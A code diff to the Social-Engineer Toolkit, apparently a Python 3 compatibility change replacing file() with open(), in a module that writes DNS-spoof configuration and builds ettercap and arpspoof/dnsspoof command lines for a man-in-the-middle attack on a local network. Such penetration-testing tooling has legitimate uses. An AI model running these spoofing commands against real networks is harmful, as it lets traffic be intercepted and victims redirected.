@@ -13,7 +13,7 @@ from src.core.setcore import *
 definepath = os.getcwd()
 
 # grab config file
-config = file("/etc/setoolkit/set.config", "r").readlines()
+config = open("/etc/setoolkit/set.config", "r").readlines()
 # grab our default directory
 cwd = os.getcwd()
 # set a variable as default to n or no
@@ -37,7 +37,7 @@ for line in config:
         ettercapchoice = 'n'
 
 # GRAB CONFIG from SET
-fileopen = file("/etc/setoolkit/set.config", "r").readlines()
+fileopen = open("/etc/setoolkit/set.config", "r").readlines()
 for line in fileopen:
     # grab the ettercap interface
     match = re.search("ETTERCAP_INTERFACE=", line)
@@ -92,7 +92,7 @@ if ettercapchoice == 'y':
             subprocess.Popen(
                 "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
             # prep etter.dns for writing
-            filewrite = file("etter.dns", "w")
+            filewrite = open("etter.dns", "w")
             # send our information to etter.dns
             filewrite.write("%s A %s" % (dns_spoof, ipaddr))
             # close the file
@@ -105,7 +105,7 @@ if ettercapchoice == 'y':
             # spawn a child process
             os.chdir(cwd)
             time.sleep(5)
-            filewrite = file(setdir + "/ettercap", "w")
+            filewrite = open(setdir + "/ettercap", "w")
             filewrite.write(
                 "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
             filewrite.close()
@@ -148,7 +148,7 @@ if dsniffchoice == 'y':
                 dns_spoof = "*"
             subprocess.Popen(
                 "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
-            filewrite = file(setdir + "/dnsspoof.conf", "w")
+            filewrite = open(setdir + "/dnsspoof.conf", "w")
             filewrite.write("%s %s" % (ipaddr, dns_spoof))
             filewrite.close()
             print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
@@ -160,7 +160,7 @@ if dsniffchoice == 'y':
             gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                 interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
             # open file for writing
-            filewrite = file(setdir + "/ettercap", "w")
+            filewrite = open(setdir + "/ettercap", "w")
             # write the arpspoof / dnsspoof commands to file
             filewrite.write(
                 "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, setdir))
